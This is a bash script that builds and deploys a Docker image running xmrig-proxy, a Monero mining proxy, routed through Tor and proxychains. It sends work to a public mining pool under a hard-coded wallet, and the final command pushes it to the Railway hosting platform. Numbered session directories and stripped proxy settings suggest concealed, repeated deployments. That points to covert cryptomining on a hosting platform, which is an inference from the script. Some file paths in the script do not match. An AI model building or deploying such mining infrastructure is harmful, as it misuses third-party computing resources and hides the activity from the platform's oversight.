#!/bin/bash
set -e

cd /home/alan/Documents/railways

cat > Dockerfile.xmrig << 'EOF'
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    tor \
    proxychains4 \
    wget \
    curl \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

RUN wget -q https://github.com/xmrig/xmrig-proxy/releases/download/v6.21.0/xmrig-proxy-6.21.0-linux-static-x64.tar.gz \
    && tar -xzf xmrig-proxy-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-proxy-6.21.0/xmrig-proxy /usr/local/bin/ \
    && rm -rf xmrig-proxy-6.21.0*

RUN mkdir -p /etc/tor /var/lib/tor && \
    echo "SocksPort 127.0.0.1:9050" > /etc/tor/torrc && \
    echo "DataDirectory /var/lib/tor" >> /etc/tor/torrc && \
    echo "Log notice stdout" >> /etc/tor/torrc

RUN echo "strict_chain\nproxy_dns\nremote_dns_subnet 224\nquiet_mode\n\nsocks5 127.0.0.1 9050" > /etc/proxychains4.conf

COPY config.json /etc/xmrig-proxy/config.json
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
EOF

cat > /home/alan/Documents/railways/xmrig-proxy-config.json << 'EOF'
{
  "bind": ["0.0.0.0:3333"],
  "pools": [
    {
      "url": "pool.supportxmr.com:3333",
      "user": "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge",
      "pass": "x",
      "keepalive": true,
      "tls": false,
      "algo": "rx/0"
    }
  ],
  "mode": "nicehash",
  "workers": true,
  "donate-level": 0,
  "retries": 5,
  "retry-pause": 5,
  "access-password": "chimera-bridge-2024",
  "http": {
    "enabled": true,
    "host": "0.0.0.0",
    "port": 8080,
    "access-token": "chimera-bridge-2024"
  },
  "tls": {
    "enabled": false
  }
}
EOF

cat > /home/alan/Documents/railways/entrypoint.sh << 'EOF'
#!/bin/bash
set -e

echo "Starting Tor..."
mkdir -p /var/lib/tor
chmod 700 /var/lib/tor
tor -f /etc/tor/torrc &
sleep 30

for i in {1..30}; do
    if grep -q "Bootstrapped 100%" /var/log/tor.log 2>/dev/null; then
        echo "Tor bootstrapped"
        break
    fi
    sleep 2
done

echo "Starting xmrig-proxy with proxychains..."
exec proxychains4 -f /etc/proxychains4.conf /usr/local/bin/xmrig-proxy -c /etc/xmrig-proxy/config.json
EOF
chmod +x /home/alan/Documents/railways/entrypoint.sh

echo "Building Docker image..."
cd /home/alan/Documents/railways
docker build -f Dockerfile.xmrig -t chimera-bridge-xmrig .

echo "Deploying to Railway..."
HOME=/home/alan/Documents/railways/sessions/session-33 LD_PRELOAD="" env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy timeout 600 /home/alan/.railway/bin/railway up --service xmrig-bridge --ci < /tmp/vars.txt
